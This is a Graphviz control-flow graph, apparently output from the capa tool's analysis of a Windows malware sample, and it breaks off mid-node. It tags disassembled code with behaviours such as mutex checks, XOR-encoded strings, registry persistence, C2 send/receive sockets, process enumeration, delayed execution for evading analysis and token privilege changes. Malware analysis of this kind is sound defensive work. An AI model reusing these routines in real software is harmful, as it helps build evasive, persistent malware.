digraph cfg {
	graph [name=cfg];
	node [shape=box];
	0	[capa_id="[]",
		capa_node=True,
		capa_title="['contain a resource (.rsrc) section']",
		end_ea=4198411,
		fill=red,
		instruction_sets="sub_401000:\lmov     eax, offset loc_405BA4\lcall    _EH_prolog\lpush    ecx\l",
		is_top_node=True,
		label="['contain a resource (.rsrc) section']",
		location="[4231168]",
		mbc_id="[]",
		mbc_title="[]",
		start_ea=4198400,
		style=filled];
	7	[capa_id="[]",
		capa_node=True,
		capa_title="['contain loop']",
		end_ea=4198475,
		fill=red,
		instruction_sets="sub_401047:\lmov     eax, [esp+arg_0]\l",
		is_top_node=True,
		label="['contain loop']",
		location="[4198471]",
		mbc_id="[]",
		mbc_title="[]",
		start_ea=4198471,
		style=filled];
	21	[capa_id="['C0038']",
		capa_node=True,
		capa_title="['create thread']",
		end_ea=4199499,
		fill=red,
		instruction_sets="call    sub_4015E9\llea     eax, [esp+18h+var_4]\lpush    eax\lpush    edi\lpush    edi\lpush    offset loc_402C3D\lpush    edi\lpush    \
edi\lcall    ds:CreateThread\lpush    1\lpop     eax\l",
		is_top_node=False,
		label="['create thread']",
		location="[4199490]",
		mbc_id="['C0038']",
		mbc_title="['Process::Create Thread']",
		start_ea=4199471,
		style=filled];
	25	[capa_id="['C0036.004', 'C0036.001', 'C0036.006', 'C0036.001', 'C0036.006', 'C0036.006']",
		capa_node=True,
		capa_title="['create or open registry key', 'set registry value', 'query or enumerate registry value', 'set registry value', 'query or enumerate \
registry value', 'query or enumerate registry value']",
		end_ea=4199658,
		fill=red,
		instruction_sets="sub_401492:\lpush    ebp\lmov     ebp, esp\lsub     esp, 288h\lpush    ebx\lpush    esi\lxor     ebx, ebx\lpush    edi\llea     \
eax, [ebp+var_4]\lpush    ebx\lpush    eax\lpush    ebx\lpush    2001Fh\lpush    ebx\lpush    offset unk_4089F0\lpush    ebx\lpush    \
offset aOkbpsNaxieNkok; \"Okbps]naXIe_nkokbpX?qnnajpJapEjb\"\lpush    80000002h\lmov     [ebp+var_8], 80h ; '€'\lxor     esi, esi\lcall    \
ds:RegCreateKeyExA\llea     eax, [ebp+var_8]\lpush    eax\llea     eax, [ebp+var_88]\lpush    eax\lpush    ebx\lpush    ebx\lpush    \
offset aPid; \"pid\"\lpush    [ebp+var_4]\lcall    ds:RegQueryValueExA\lcmp     eax, ebx\ljnz     short loc_401511\l",
		is_top_node=True,
		label="['create or open registry key', 'set registry value', 'query or enumerate registry value', 'set registry value', 'query or enumerate \
registry value', 'query or enumerate registry value']",
		location="[4199621, 4199570, 4199648]",
		mbc_id="['C0036.004', 'C0036.001', 'C0036.006', 'C0036.001', 'C0036.006', 'C0036.006']",
		mbc_title="['Operating System::Registry::Create Registry Key', 'Operating System::Registry::Set Registry Key', 'Operating System::Registry::\
Query Registry Value', 'Operating System::Registry::Set Registry Key', 'Operating System::Registry::Query Registry Value', 'Operating \
System::Registry::Query Registry Value']",
		start_ea=4199570,
		style=filled];
	35	[capa_id="['C0036.001']",
		capa_node=True,
		capa_title="['set registry value']",
		end_ea=4199894,
		fill=red,
		instruction_sets="push    ebx\lcall    ds:time\lpush    eax\lcall    ds:srand\lpop     ecx\lpop     ecx\lcall    ds:rand\lpush    4\lpush    edi\lpush    \
4\lpush    ebx\lpush    esi\lmov     dword_407F1C, eax\lpush    [ebp+var_4]\lcall    ds:RegSetValueExA\l",
		is_top_node=False,
		label="['set registry value']",
		location="[4199888]",
		mbc_id="['C0036.001']",
		mbc_title="['Operating System::Registry::Set Registry Key']",
		start_ea=4199851,
		style=filled];
	25 -> 35	[key=0,
		color=darkgreen,
		label=true];
	40	[capa_id="['E1083', 'C0036.007', 'C0036.007']",
		capa_node=True,
		capa_title="['get common file path', 'delete registry value', 'delete registry value']",
		end_ea=4200095,
		fill=red,
		instruction_sets="sub_401612:\lpush    ebp\lmov     ebp, esp\lsub     esp, 204h\lpush    esi\llea     eax, [ebp+var_204]\lpush    200h\lpush    eax\lcall    \
ds:GetWindowsDirectoryA\llea     eax, [ebp+var_201]\lpush    offset unk_4074E8\lpush    eax\lcall    strcpy\llea     eax, [ebp+var_\
204]\lpush    offset unk_4074F8\lpush    eax\lcall    strcat\llea     eax, [ebp+var_204]\lpush    offset asc_407708; \"\\\\\"\lpush    \
eax\lcall    strcat\llea     eax, [ebp+var_204]\lpush    offset unk_408528\lpush    eax\lcall    strcat\ladd     esp, 20h\lxor     \
esi, esi\llea     eax, [ebp+var_4]\lpush    esi\lpush    eax\lpush    esi\lpush    2001Fh\lpush    esi\lpush    offset unk_4089F0\lpush    \
esi\lpush    offset aOkbpsNaxieNkok_0; \"Okbps]naXIe_nkokbpXSej`ksoX?qnnajpRanoe\"...\lpush    80000001h\lcall    ds:RegCreateKeyExA\lcmp     [\
ebp+arg_4], 1\ljnz     short loc_4016C5\l",
		is_top_node=True,
		label="['get common file path', 'delete registry value', 'delete registry value']",
		location="[4199976, 4200083, 4199954]",
		mbc_id="['E1083', 'C0036.007', 'C0036.007']",
		mbc_title="['Discovery::File and Directory Discovery', 'Operating System::Registry::Delete Registry Value', 'Operating System::Registry::Delete \
Registry Value']",
		start_ea=4199954,
		style=filled];
	42	[capa_id="['C0036.007']",
		capa_node=True,
		capa_title="['delete registry value']",
		end_ea=4200145,
		fill=red,
		instruction_sets="push    [ebp+arg_0]\lpush    [ebp+var_4]\lcall    ds:RegDeleteValueA\l",
		is_top_node=False,
		label="['delete registry value']",
		location="[4200139]",
		mbc_id="['C0036.007']",
		mbc_title="['Operating System::Registry::Delete Registry Value']",
		start_ea=4200133,
		style=filled];
	40 -> 42	[key=0,
		color=darkgreen,
		label=true];
	46	[capa_id="['C0043', 'C0043']",
		capa_node=True,
		capa_title="['check mutex', 'check mutex and exit']",
		end_ea=4200197,
		fill=red,
		instruction_sets="sub_4016E2:\lpush    ebp\lmov     ebp, esp\lsub     esp, 600h\lpush    ebx\lpush    esi\lmov     esi, offset aIeNkokbpvf; \"Ie_nkokbpVf\"\lxor     \
ebx, ebx\lpush    esi\lpush    ebx\lpush    1F0001h\lcall    ds:OpenMutexA\lcmp     eax, ebx\ljnz     short loc_401713\l",
		is_top_node=True,
		label="['check mutex', 'check mutex and exit']",
		location="[4200187, 4200162]",
		mbc_id="['C0043', 'C0043']",
		mbc_title="['Process::Check Mutex', 'Process::Check Mutex']",
		start_ea=4200162,
		style=filled];
	47	[capa_id="['C0042', 'C0043']",
		capa_node=True,
		capa_title="['create mutex', 'check mutex and exit']",
		end_ea=4200211,
		fill=red,
		instruction_sets="push    esi\lpush    ebx\lpush    ebx\lcall    ds:CreateMutexA\ljmp     loc_4017F7\l",
		is_top_node=False,
		label="['create mutex', 'check mutex and exit']",
		location="[4200200]",
		mbc_id="['C0042', 'C0043']",
		mbc_title="['Process::Create Mutex', 'Process::Check Mutex']",
		start_ea=4200197,
		style=filled];
	46 -> 47	[key=0,
		color=red,
		label=false];
	51	[capa_id="['B0003.003', 'B0003.003', 'C0043', 'C0047']",
		capa_node=True,
		capa_title="['delay execution', 'delay execution', 'check mutex and exit', 'delete file']",
		end_ea=4200439,
		fill=red,
		instruction_sets="push    dword_407E64\lcall    ds:SetEvent\lpush    1388h\lpush    dword_407E60\lcall    ds:WaitForSingleObject\lpush    1F4h\lcall    \
ds:Sleep\llea     eax, [ebp+var_200]\lpush    200h\lpush    eax\lcall    ds:GetWindowsDirectoryA\llea     eax, [ebp+var_1FD]\lpush    \
offset unk_4074E8\lpush    eax\lcall    strcpy\llea     eax, [ebp+var_200]\lpush    offset unk_4074F8\lpush    eax\lcall    strcat\llea     \
eax, [ebp+var_200]\lpush    offset asc_407708; \"\\\\\"\lpush    eax\lcall    strcat\llea     eax, [ebp+var_200]\lpush    edi\lpush    \
eax\lcall    strcat\ladd     esp, 20h\llea     eax, [ebp+var_200]\lpush    ebx\lpush    eax\lcall    ds:SetFileAttributesA\llea     \
eax, [ebp+var_200]\lpush    eax\lcall    ds:DeleteFileA\lpush    ebx\lpush    edi\lcall    sub_401612\lpop     ecx\lpop     ecx\lpush    \
esi\lpush    ebx\lpush    ebx\lcall    ds:CreateMutexA\lpop     edi\l",
		is_top_node=False,
		label="['delay execution', 'delay execution', 'check mutex and exit', 'delete file']",
		location="[4200302, 4200291, 4200414]",
		mbc_id="['B0003.003', 'B0003.003', 'C0043', 'C0047']",
		mbc_title="['Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed Execution', 'Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed \
Execution', 'Process::Check Mutex', 'File System::Delete File']",
		start_ea=4200268,
		style=filled];
	46 -> 51	[key=0,
		color=darkgreen,
		label=true];
	53	[capa_id="['C0043', 'C0018', 'C0045']",
		capa_node=True,
		capa_title="['check mutex and exit', 'terminate process', 'copy file']",
		end_ea=4200681,
		fill=red,
		instruction_sets="call    sub_402FAE\llea     eax, [ebp+var_200]\lpush    ebx\lpush    eax\lcall    ds:SetFileAttributesA\llea     eax, [ebp+var_200]\lpush    \
ebx\lpush    eax\llea     eax, [ebp+var_600]\lpush    eax\lcall    ds:CopyFileA\llea     eax, [ebp+var_200]\lpush    eax\lcall    \
sub_4047D2\llea     eax, [ebp+var_200]\lpush    eax\lcall    sub_40511A\lpop     ecx\lpop     ecx\lpush    1\lcall    ds:ExitProcess\l",
		is_top_node=False,
		label="['check mutex and exit', 'terminate process', 'copy file']",
		location="[4200675, 4200641]",
		mbc_id="['C0043', 'C0018', 'C0045']",
		mbc_title="['Process::Check Mutex', 'Process::Terminate Process', 'File System::Copy File']",
		start_ea=4200607,
		style=filled];
	47 -> 53	[key=0];
	51 -> 53	[key=0];
	56	[capa_id="[]",
		capa_node=True,
		capa_title="['get OS version']",
		end_ea=4200750,
		fill=red,
		instruction_sets="push    esi\lmov     dword ptr [esi], 94h ; '”'\lcall    edi ; GetVersionExA\l",
		is_top_node=False,
		label="['get OS version']",
		location="[4200748]",
		mbc_id="[]",
		mbc_title="[]",
		start_ea=4200741,
		style=filled];
	58	[capa_id="['T1016', 'T1016']",
		capa_node=True,
		capa_title="['get proxy', 'get proxy']",
		end_ea=4200817,
		fill=red,
		instruction_sets="sub_40193D:\lpush    ebp\lmov     ebp, esp\lsub     esp, 108h\lpush    ebx\lpush    esi\llea     eax, [ebp+var_4]\lpush    edi\lpush    \
eax\lxor     ebx, ebx\lpush    1\lpush    ebx\lpush    offset aSoftwareMicros; \"Software\\\\Microsoft\\\\Windows\\\\CurrentVe\"...\lpush    \
80000001h\lmov     [ebp+var_8], 4\lcall    ds:RegOpenKeyExA\ltest    eax, eax\ljnz     loc_401A19\l",
		is_top_node=True,
		label="['get proxy', 'get proxy']",
		location="[4200803, 4200765]",
		mbc_id="['T1016', 'T1016']",
		mbc_title="['Discovery::System Network Configuration Discovery', 'Discovery::System Network Configuration Discovery']",
		start_ea=4200765,
		style=filled];
	59	[capa_id="['T1016']",
		capa_node=True,
		capa_title="['get proxy']",
		end_ea=4200891,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_8]\lmov     esi, ds:RegQueryValueExA\lpush    eax\lpush    offset dword_40871C\lpush    ebx\lpush    ebx\lpush    \
offset aProxyenable; \"ProxyEnable\"\lpush    [ebp+var_4]\lcall    esi ; RegQueryValueExA\lmov     edi, eax\llea     eax, [ebp+var_\
8]\lpush    eax\llea     eax, [ebp+var_108]\lpush    eax\lpush    ebx\lpush    ebx\lpush    offset aProxyserver; \"ProxyServer\"\lpush    [\
ebp+var_4]\lmov     [ebp+var_8], 100h\lcall    esi ; RegQueryValueExA\lpush    [ebp+var_4]\lmov     esi, eax\lcall    ds:RegCloseKey\lcmp     \
edi, ebx\ljnz     short loc_401A19\l",
		is_top_node=False,
		label="['get proxy']",
		location="[4200859]",
		mbc_id="['T1016']",
		mbc_title="['Discovery::System Network Configuration Discovery']",
		start_ea=4200817,
		style=filled];
	58 -> 59	[key=0,
		color=red,
		label=false];
	68	[capa_id="['B0030.002', 'B0030.001']",
		capa_node=True,
		capa_title="['receive data', 'send data']",
		end_ea=4201059,
		fill=red,
		instruction_sets="sub_401A20:\lpush    ebp\lmov     ebp, esp\lmov     eax, 2128h\lcall    __alloca_probe\lpush    ebx\lpush    esi\lpush    edi\lpush    [\
ebp+arg_0]\lcall    sub_4028C2\lmov     edi, ds:inet_addr\lpop     ecx\lpush    eax\lcall    edi ; inet_addr\lxor     ebx, ebx\lmov     [\
ebp+var_14], eax\lmov     eax, [ebp+arg_4]\lpush    ebx\lpush    1\lpush    2\lmov     [ebp+var_10], eax\lcall    ds:socket\lmov     \
esi, eax\lcmp     esi, 0FFFFFFFFh\ljz      loc_401BE2\l",
		is_top_node=True,
		label="['receive data', 'send data']",
		location="[4200992]",
		mbc_id="['B0030.002', 'B0030.001']",
		mbc_title="['Command and Control::C2 Communication::Receive Data', 'Command and Control::C2 Communication::Send Data']",
		start_ea=4200992,
		style=filled];
	69	[capa_id="['C0001.001']",
		capa_node=True,
		capa_title="['set socket configuration']",
		end_ea=4201116,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_C]\lmov     [ebp+var_C], 1\lpush    eax\lpush    8004667Eh\lpush    esi\lcall    ds:ioctlsocket\lcmp     dword_\
40871C, ebx\lmov     [ebp+var_8], 3Ch ; '<'\lmov     [ebp+var_4], ebx\lmov     [ebp+var_124], esi\lmov     [ebp+var_128], 1\ljz      \
short loc_401AAC\l",
		is_top_node=False,
		label="['set socket configuration']",
		location="[4201076]",
		mbc_id="['C0001.001']",
		mbc_title="['Communication::Socket Communication::Set Socket Config']",
		start_ea=4201059,
		style=filled];
	68 -> 69	[key=0,
		color=red,
		label=false];
	73	[capa_id="['C0001.007', 'B0030.001']",
		capa_node=True,
		capa_title="['send data on socket', 'send data']",
		end_ea=4201288,
		fill=red,
		instruction_sets="push    [ebp+arg_10]\llea     eax, [ebp+var_2128]\lpush    [ebp+arg_1C]\lpush    [ebp+arg_8]\lpush    [ebp+arg_4]\lpush    [ebp+\
arg_0]\lpush    eax\lcall    sub_402673\llea     eax, [ebp+var_2128]\lpush    eax\lcall    strlen\lpush    [ebp+arg_10]\lmov     \
edi, eax\lpush    [ebp+arg_C]\llea     eax, [ebp+edi+var_2128]\lpush    eax\lcall    memcpy\lmov     eax, [ebp+arg_10]\ladd     \
esp, 28h\ladd     edi, eax\llea     eax, [ebp+var_2128]\lpush    ebx\lpush    edi\lpush    eax\lpush    esi\lcall    ds:send\lcmp     [\
ebp+arg_1C], 1\ljnz     short loc_401B71\l",
		is_top_node=False,
		label="['send data on socket', 'send data']",
		location="[4201276]",
		mbc_id="['C0001.007', 'B0030.001']",
		mbc_title="['Communication::Socket Communication::Send Data', 'Command and Control::C2 Communication::Send Data']",
		start_ea=4201198,
		style=filled];
	69 -> 73	[key=0,
		color=red,
		label=false];
	74	[capa_id="['C0001.012']",
		capa_node=True,
		capa_title="['get socket status']",
		end_ea=4201315,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_8]\lpush    eax\llea     eax, [ebp+var_128]\lpush    ebx\lpush    eax\llea     eax, [esi+1]\lpush    ebx\lpush    \
eax\lcall    ds:select\ltest    eax, eax\ljle     short loc_401B66\l",
		is_top_node=False,
		label="['get socket status']",
		location="[4201305]",
		mbc_id="['C0001.012']",
		mbc_title="['Communication::Socket Communication::Get Socket Status']",
		start_ea=4201288,
		style=filled];
	73 -> 74	[key=0,
		color=red,
		label=false];
	81	[capa_id="['C0001.006', 'B0030.002']",
		capa_node=True,
		capa_title="['receive data on socket', 'receive data']",
		end_ea=4201404,
		fill=red,
		instruction_sets="mov     eax, 3E800h\lpush    ebx\lsub     eax, edi\lpush    eax\lmov     eax, [ebp+arg_14]\ladd     eax, edi\lpush    eax\lpush    \
esi\lcall    ds:recv\lcmp     eax, 0FFFFFFFFh\ljz      short loc_401BDB\l",
		is_top_node=False,
		label="['receive data on socket', 'receive data']",
		location="[4201393]",
		mbc_id="['C0001.006', 'B0030.002']",
		mbc_title="['Communication::Socket Communication::Receive Data', 'Command and Control::C2 Communication::Receive Data']",
		start_ea=4201377,
		style=filled];
	73 -> 81	[key=0,
		color=darkgreen,
		label=true];
	81 -> 81	[key=0,
		color=red,
		label=false];
	94	[capa_id="['T1129', 'T1129', 'T1129']",
		capa_node=True,
		capa_title="['link function at runtime on Windows', 'link function at runtime on Windows', 'link function at runtime on Windows']",
		end_ea=4201955,
		fill=red,
		instruction_sets="sub_401C7F:\lpush    ebp\lmov     ebp, esp\lmov     eax, 3ED08h\lcall    __alloca_probe\lpush    ebx\lpush    esi\lpush    edi\lpush    \
offset aKernel32Dll_0; \"Kernel32.dll\"\lcall    ds:LoadLibraryA\lpush    offset aGettickcount; \"GetTickCount\"\lpush    eax\lcall    \
ds:GetProcAddress\lmov     ebx, eax\lmov     esi, offset byte_4087E4\llea     eax, [ebp+var_508]\lpush    esi\lpush    eax\lcall    \
strcpy\lpush    esi\lcall    strlen\lmov     esi, eax\lmov     edi, offset unk_4087C4\linc     esi\lpush    edi\llea     eax, [ebp+\
esi+var_508]\lpush    eax\lcall    strcpy\lpush    edi\lcall    strlen\llea     esi, [esi+eax+1]\lmov     edi, 9Ch ; 'œ'\lpush    \
edi\lpush    offset unk_408728\llea     eax, [ebp+esi+var_508]\lpush    eax\lcall    memcpy\lmov     ax, word_408722\ladd     esi, \
edi\lmov     edi, offset a1021; \"10.21\"\lmov     word ptr [ebp+esi+var_508], ax\linc     esi\linc     esi\lcmp     dword_40871C, \
0\lpush    edi\lsetnz   al\lmov     byte ptr [ebp+esi+var_508], al\lmov     eax, dword_407F1C\linc     esi\lmov     [ebp+esi+var_\
508], eax\ladd     esi, 4\llea     eax, [ebp+esi+var_508]\lpush    eax\lcall    strcpy\lpush    edi\lcall    strlen\ladd     esp, \
30h\llea     esi, [esi+eax+1]\lcall    ebx\lmov     ecx, 36EE80h\lxor     edx, edx\lmov     ebx, ecx\lmov     edi, eax\ldiv     \
ebx\lmov     ebx, 0EA60h\lmov     eax, edx\lxor     edx, edx\ldiv     ebx\lxor     edx, edx\lpush    eax\lmov     eax, edi\ldiv     \
ecx\lpush    eax\llea     eax, [ebp+var_108]\lpush    offset aUU; \"%u:%u\"\lpush    eax\lcall    ds:sprintf\llea     eax, [ebp+var_\
108]\lpush    eax\llea     eax, [ebp+esi+var_508]\lpush    eax\lcall    strcpy\llea     eax, [ebp+var_108]\lpush    eax\lcall    \
strlen\llea     esi, [esi+eax+1]\llea     eax, [ebp+var_108]\lpush    offset unk_4084A8\lpush    eax\lcall    strcpy\llea     eax, [\
ebp+var_108]\lpush    2Fh ; '/'\lpush    eax\lcall    ds:strrchr\lmov     edi, offset unk_408628\llea     ebx, [ebp+esi+var_508]\lpush    \
edi\lpush    ebx\lmov     [ebp+var_4], eax\lcall    strcpy\lmov     eax, [ebp+var_4]\ladd     esp, 34h\ltest    eax, eax\ljz      \
short loc_401E10\l",
		is_top_node=True,
		label="['link function at runtime on Windows', 'link function at runtime on Windows', 'link function at runtime on Windows']",
		location="[4201620, 4201803, 4201632]",
		mbc_id="['T1129', 'T1129', 'T1129']",
		mbc_title="['Execution::Shared Modules', 'Execution::Shared Modules', 'Execution::Shared Modules']",
		start_ea=4201599,
		style=filled];
	132	[capa_id="['C0016', 'C0052', 'C0052', 'C0052']",
		capa_node=True,
		capa_title="['create or open file', 'write file on Windows', 'write file on Windows', 'write file on Windows']",
		end_ea=4202809,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_40C]\lpush    400h\lpush    eax\lcall    ds:GetWindowsDirectoryA\llea     eax, [ebp+var_40C]\lpush    offset \
aXjaporAta; \"Xjapor_*ata\"\lpush    eax\lcall    strcat\lpop     ecx\llea     eax, [ebp+var_40C]\lpop     ecx\lpush    ebx\lpush    \
2\lpush    2\lpush    ebx\lpush    ebx\lpush    40000000h\lpush    eax\lcall    ds:CreateFileA\lmov     esi, eax\lcmp     esi, 0FFFFFFFFh\ljz      \
short loc_402168\l",
		is_top_node=False,
		label="['create or open file', 'write file on Windows', 'write file on Windows', 'write file on Windows']",
		location="[4202796, 4202790, 4202784]",
		mbc_id="['C0016', 'C0052', 'C0052', 'C0052']",
		mbc_title="['File System::Create File', 'File System::Writes File', 'File System::Writes File', 'File System::Writes File']",
		start_ea=4202740,
		style=filled];
	133	[capa_id="['C0052']",
		capa_node=True,
		capa_title="['write file on Windows']",
		end_ea=4202840,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_C]\lpush    ebx\lpush    eax\lpush    [ebp+var_8]\lpush    [ebp+var_4]\lpush    esi\lcall    ds:WriteFile\lpush    \
esi\lmov     edi, eax\lcall    ds:CloseHandle\lcmp     edi, ebx\ljz      short loc_402168\l",
		is_top_node=False,
		label="['write file on Windows']",
		location="[4202821]",
		mbc_id="['C0052']",
		mbc_title="['File System::Writes File']",
		start_ea=4202809,
		style=filled];
	132 -> 133	[key=0,
		color=red,
		label=false];
	224	[capa_id="['E1027.m02', 'E1027.m02']",
		capa_node=True,
		capa_title="['encode data using XOR', 'encode data using XOR']",
		end_ea=4204621,
		fill=red,
		instruction_sets="mov     dl, [eax+ecx]\lxor     dl, 23h\lmov     [ecx], dl\linc     ecx\ldec     esi\ljnz     short loc_402841\l",
		is_top_node=False,
		label="['encode data using XOR', 'encode data using XOR']",
		location="[4204612, 4204609]",
		mbc_id="['E1027.m02', 'E1027.m02']",
		mbc_title="['Defense Evasion::Obfuscated Files or Information::Encoding-Standard Algorithm', 'Defense Evasion::Obfuscated Files or Information::\
Encoding-Standard Algorithm']",
		start_ea=4204609,
		style=filled];
	224 -> 224	[key=0,
		color=darkgreen,
		label=true];
	227	[capa_id="['E1082', 'E1082']",
		capa_node=True,
		capa_title="['get hostname', 'get hostname']",
		end_ea=4204686,
		fill=red,
		instruction_sets="sub_40284F:\lpush    ebp\lmov     ebp, esp\lsub     esp, 104h\llea     eax, [ebp+var_4]\lmov     [ebp+var_4], 0FFh\lpush    eax\lpush    \
offset byte_4087E4\lcall    ds:GetComputerNameA\lmov     eax, [ebp+var_4]\lpush    0FFh\land     byte_4087E4[eax], 0\llea     eax, [\
ebp+var_104]\lpush    eax\lcall    ds:gethostname\ltest    eax, eax\ljnz     short loc_4028AF\l",
		is_top_node=True,
		label="['get hostname', 'get hostname']",
		location="[4204648, 4204676]",
		mbc_id="['E1082', 'E1082']",
		mbc_title="['Discovery::System Information Discovery', 'Discovery::System Information Discovery']",
		start_ea=4204623,
		style=filled];
	228	[capa_id="['C0011.001']",
		capa_node=True,
		capa_title="['resolve DNS']",
		end_ea=4204703,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_104]\lpush    eax\lcall    ds:gethostbyname\ltest    eax, eax\ljz      short loc_4028AF\l",
		is_top_node=False,
		label="['resolve DNS']",
		location="[4204693]",
		mbc_id="['C0011.001']",
		mbc_title="['Communication::DNS Communication::Resolve']",
		start_ea=4204686,
		style=filled];
	227 -> 228	[key=0,
		color=red,
		label=false];
	280	[capa_id="['cnd']",
		capa_node=False,
		capa_title="['jnz     short loc_402C69']",
		end_ea=4205647,
		instruction_sets="push    0\lpush    dword_407E64\lcall    ds:WaitForSingleObject\ltest    eax, eax\ljnz     short loc_402C69\l",
		is_top_node=False,
		label="['jnz     short loc_402C69']",
		location="[]",
		mbc_id="['cnd']",
		mbc_title="['jnz     short loc_402C69']",
		start_ea=4205629];
	281	[capa_id="[]",
		capa_node=False,
		capa_title="[]",
		end_ea=4205673,
		instruction_sets="push    dword_407E60\lcall    ds:SetEvent\lcall    ds:WSACleanup\lpush    1\lcall    ds:ExitProcess\l",
		is_top_node=False,
		label="[]",
		location="[]",
		mbc_id="[]",
		mbc_title="[]",
		start_ea=4205647];
	280 -> 281	[key=0,
		color=red,
		label=false];
	282	[capa_id="[]",
		capa_node=False,
		capa_title="[]",
		end_ea=4205686,
		instruction_sets="push    3E8h\lcall    ds:Sleep\ljmp     short loc_402C3D\l",
		is_top_node=False,
		label="[]",
		location="[]",
		mbc_id="[]",
		mbc_title="[]",
		start_ea=4205673];
	280 -> 282	[key=0,
		color=darkgreen,
		label=true];
	282 -> 280	[key=0];
	332	[capa_id="['E1082']",
		capa_node=True,
		capa_title="['get disk information']",
		end_ea=4206304,
		fill=red,
		instruction_sets="sub_402E82:\lpush    ebp\lmov     ebp, esp\lsub     esp, 488h\land     [ebp+var_4], 0\lpush    esi\lmov     esi, offset byte_4087E4\llea     \
eax, [ebp+var_283]\lpush    esi\lpush    eax\lmov     byte ptr [ebp+var_288], 41h ; 'A'\lcall    strcpy\lpush    esi\lcall    strlen\lmov     \
esi, eax\lmov     eax, dword_407F1C\ladd     esi, 6\ladd     esp, 0Ch\lmov     [ebp+esi+var_288], eax\llea     eax, [ebp+var_488]\lpush    \
eax\lpush    200h\ladd     esi, 4\lcall    ds:GetLogicalDriveStringsA\ltest    eax, eax\ljz      loc_402F96\l",
		is_top_node=True,
		label="['get disk information']",
		location="[4206290]",
		mbc_id="['E1082']",
		mbc_title="['Discovery::System Information Discovery']",
		start_ea=4206210,
		style=filled];
	335	[capa_id="['E1082']",
		capa_node=True,
		capa_title="['get disk information']",
		end_ea=4206368,
		fill=red,
		instruction_sets="push    edi\lcall    strlen\lmov     ebx, eax\llea     eax, [ebp+esi+var_288]\lpush    edi\lpush    eax\linc     ebx\lcall    strcpy\ladd     \
esp, 0Ch\ladd     esi, ebx\lpush    edi\lcall    ds:GetDriveTypeA\lcmp     eax, 2\lmov     [ebp+var_8], eax\ljz      short loc_402F3E\l",
		is_top_node=False,
		label="['get disk information']",
		location="[4206354]",
		mbc_id="['E1082']",
		mbc_title="['Discovery::System Information Discovery']",
		start_ea=4206325,
		style=filled];
	332 -> 335	[key=0,
		color=red,
		label=false];
	335 -> 335	[key=0,
		color=darkgreen,
		label=true];
	336	[capa_id="['E1082']",
		capa_node=True,
		capa_title="['get disk information']",
		end_ea=4206398,
		fill=red,
		instruction_sets="xor     eax, eax\lpush    eax\lpush    eax\lpush    eax\lpush    eax\lpush    eax\llea     eax, [ebp+var_88]\lpush    80h ; '€'\lpush    \
eax\lpush    edi\lcall    ds:GetVolumeInformationA\ltest    eax, eax\ljnz     short loc_402F45\l",
		is_top_node=False,
		label="['get disk information']",
		location="[4206388]",
		mbc_id="['E1082']",
		mbc_title="['Discovery::System Information Discovery']",
		start_ea=4206368,
		style=filled];
	335 -> 336	[key=0,
		color=red,
		label=false];
	336 -> 335	[key=0,
		color=darkgreen,
		label=true];
	345	[capa_id="['T1057', 'T1057', 'T1057']",
		capa_node=True,
		capa_title="['enumerate processes', 'enumerate processes', 'enumerate processes']",
		end_ea=4206727,
		fill=red,
		instruction_sets="mov     esi, 200h\llea     eax, [ebp+var_340]\lpush    esi\lpush    eax\lcall    ds:GetWindowsDirectoryA\llea     eax, [ebp+var_\
33D]\lpush    offset unk_4074E8\lpush    eax\lcall    strcpy\llea     eax, [ebp+var_340]\lpush    offset unk_4074F8\lpush    eax\lcall    \
strcat\llea     eax, [ebp+var_340]\lpush    offset asc_407708; \"\\\\\"\lpush    eax\lcall    strcat\llea     eax, [ebp+var_340]\lpush    \
offset unk_408528\lpush    eax\lcall    strcat\ladd     esp, 20h\lpush    ebx\lpush    2\lcall    CreateToolhelp32Snapshot\lmov     \
edi, ds:CloseHandle\lcmp     eax, 0FFFFFFFFh\lmov     [ebp+var_10], eax\ljz      loc_40315C\l",
		is_top_node=False,
		label="['enumerate processes', 'enumerate processes', 'enumerate processes']",
		location="[4206704, 4206611, 4206702]",
		mbc_id="['T1057', 'T1057', 'T1057']",
		mbc_title="['Discovery::Process Discovery', 'Discovery::Process Discovery', 'Discovery::Process Discovery']",
		start_ea=4206611,
		style=filled];
	346	[capa_id="['T1057']",
		capa_node=True,
		capa_title="['enumerate processes']",
		end_ea=4206750,
		fill=red,
		instruction_sets="lea     ecx, [ebp+var_140]\lmov     [ebp+var_140], 128h\lpush    ecx\lpush    eax\lcall    Process32First\l",
		is_top_node=False,
		label="['enumerate processes']",
		location="[4206745]",
		mbc_id="['T1057']",
		mbc_title="['Discovery::Process Discovery']",
		start_ea=4206727,
		style=filled];
	345 -> 346	[key=0,
		color=red,
		label=false];
	354	[capa_id="['T1057']",
		capa_node=True,
		capa_title="['enumerate processes']",
		end_ea=4206912,
		fill=red,
		instruction_sets="lea     eax, [ebp+var_140]\lpush    eax\lpush    [ebp+var_10]\lcall    Process32Next\ljmp     loc_40309E\l",
		is_top_node=False,
		label="['enumerate processes']",
		location="[4206902]",
		mbc_id="['T1057']",
		mbc_title="['Discovery::Process Discovery']",
		start_ea=4206892,
		style=filled];
	346 -> 354	[key=0];
	354 -> 354	[key=0];
	366	[capa_id="['T1134']",
		capa_node=True,
		capa_title="['modify access privileges']",
		end_ea=4207143,
		fill=red,
		instruction_sets="sub_403200:\lpush    ebp\lmov     ebp, esp\lsub     esp, 10h\llea     eax, [ebp+var_C]\lmov     [ebp+var_10], 1\lpush    eax\lmov     [\
ebp+var_4], 2\lpush    [ebp+arg_4]\lpush    0\lcall    ds:LookupPrivilegeValueA\ltest    eax, eax\ljz      short loc_40325C\l",
		is_top_node=True,
		label="['modify access privileges']",
		location="[4207133]",
		mbc_id="['T1134']",
		mbc_title="['Privilege Escalation::Access Token Manipulation']",
		start_ea=4207104,
		style=filled];
	367	[capa_id="['T1134']",
		capa_node=True,
		capa_title="['modify access privileges']",
		end_ea=4207176,
		fill=red,
		instruction_sets="push    10h\llea     ecx, [ebp+arg_4]\lpop     eax\lpush    ecx\lmov     [ebp+arg_4], eax\lpush    [ebp+arg_8]\lpush    eax\llea     \
eax, [ebp+var_10]\lpush    eax\lpush    0\lpush    [ebp+arg_0]\lcall    ds:AdjustTokenPrivileges\ltest    eax, eax\ljz      short \
loc_40325C\l",
		is_top_node=False,
